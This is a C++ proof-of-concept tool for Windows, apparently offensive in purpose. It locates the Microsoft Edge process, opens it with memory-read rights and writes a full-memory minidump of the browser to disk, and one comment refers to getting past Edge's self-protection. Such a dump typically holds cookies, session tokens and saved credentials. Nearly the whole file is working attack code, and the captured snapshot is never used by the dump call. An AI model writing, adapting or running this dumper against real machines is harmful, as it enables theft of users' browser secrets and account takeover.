#include <windows.h>
#include <tlhelp32.h>
#include <processsnapshot.h>
#include <dbghelp.h>
#include <iostream>
#include <string>
#include <vector>

#pragma comment(lib, "Dbghelp.lib")

// Helper for CMD colors
void SetColor(WORD color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}



// Search for the process' PID by its name -- Currently, the process name is hardcoded here but I can always change it to user input (Out of Scope for this PoC)
DWORD GetPidByName(const std::wstring& processName) {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W entry;
        entry.dwSize = sizeof(entry);
        if (Process32FirstW(snapshot, &entry)) {
            do {
                if (std::wstring(entry.szExeFile) == processName) {
                    pid = entry.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &entry));
        }
        CloseHandle(snapshot);
    }
    return pid;
}



// Main FCT
int main() {
    std::wstring targetName = L"msedge.exe";
    std::wstring dumpName = L"edge_snapped.dmp";
    
    // Process Scan
    SetColor(14); std::wcout << L"[*] "; SetColor(7);
    std::wcout << L"Scanning processes for " << targetName << std::endl;
    DWORD targetPid = GetPidByName(targetName);
    if (targetPid == 0) {
        SetColor(12); std::cerr << "[-] "; SetColor(7);
        std::cerr << "Could not find " << std::string(targetName.begin(), targetName.end()) << std::endl;
        return 1;
    }
    SetColor(10); std::wcout << L"[+] "; SetColor(7);
    std::wcout << L"Found " << targetName << L" at PID " << targetPid << L"\n" << std::endl;



    // Handle to Edge process with limited perms: PROCESS_VM_READ & PROCESS_DUP_HANDLE
    SetColor(14); std::wcout << L"[*] "; SetColor(7);
    std::wcout << L"Creating handle to process " << targetPid << L" with permissions: PROCESS_VM_READ & PROCESS_DUP_HANDLE" << std::endl;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE, FALSE, targetPid);
    if (!hProcess) {
        SetColor(12); std::cerr << "[-] "; SetColor(7);
        std::cerr << "OpenProcess failed. Error: " << GetLastError() << " (Check Admin rights)" << std::endl;
        return 1;
    }
    SetColor(10); std::wcout << L"[+] "; SetColor(7);
    std::wcout << L"Handle to process acquired!\n" << std::endl;



    // Process Snapshot
    SetColor(14); std::wcout << L"[*] "; SetColor(7);
    std::wcout << L"Attempting Process Snapshot... " << std::endl;
    HPSS hSnapshot = NULL;
    DWORD flags = PSS_CAPTURE_VA_SPACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_HANDLES;
    DWORD result = PssCaptureSnapshot(hProcess, (PSS_CAPTURE_FLAGS)flags, 0, &hSnapshot);
    if (result != ERROR_SUCCESS) {
        SetColor(12); std::cerr << "[-] "; SetColor(7);
        std::cerr << "Snapshot failed. Error Code: " << result << std::endl;
        if (result == 5) std::cerr << "[!] Error 5 = Access Denied. Edge's self-protection is blocking this." << std::endl;
        CloseHandle(hProcess);
        return 1;
    }
    SetColor(10); std::wcout << L"[+] "; SetColor(7);
    std::wcout << L"Process successfully Snapshotted!\n" << std::endl;



    // DMP file creation
    HANDLE hFile = CreateFileW(dumpName.c_str(), GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        SetColor(12); std::cerr << "[-] "; SetColor(7);
        std::cerr << "File creation failed." << std::endl;
        PssFreeSnapshot(GetCurrentProcess(), hSnapshot);
        CloseHandle(hProcess);
        return 1;
    }



    // Dump memory into file
    SetColor(14); std::wcout << L"[*] "; SetColor(7);
    std::wcout << L"Dumping the memory into a file..." << std::endl;
    BOOL success = MiniDumpWriteDump(
        hProcess, 
        targetPid, 
        hFile, 
        MiniDumpWithFullMemory, 
        NULL, 
        NULL, 
        NULL
    );
    if (success) {
        SetColor(10); std::cout << "[+] "; SetColor(7);
        std::cout << "SUCCESS! Dump saved.\n" << std::endl;
    } else {
        SetColor(12); std::cerr << "[-] MiniDumpWriteDump failed. Error: " << GetLastError() << std::endl; SetColor(7);
    }



    // Cleanup
    CloseHandle(hFile);
    PssFreeSnapshot(GetCurrentProcess(), hSnapshot);
    CloseHandle(hProcess);
    return 0;
}
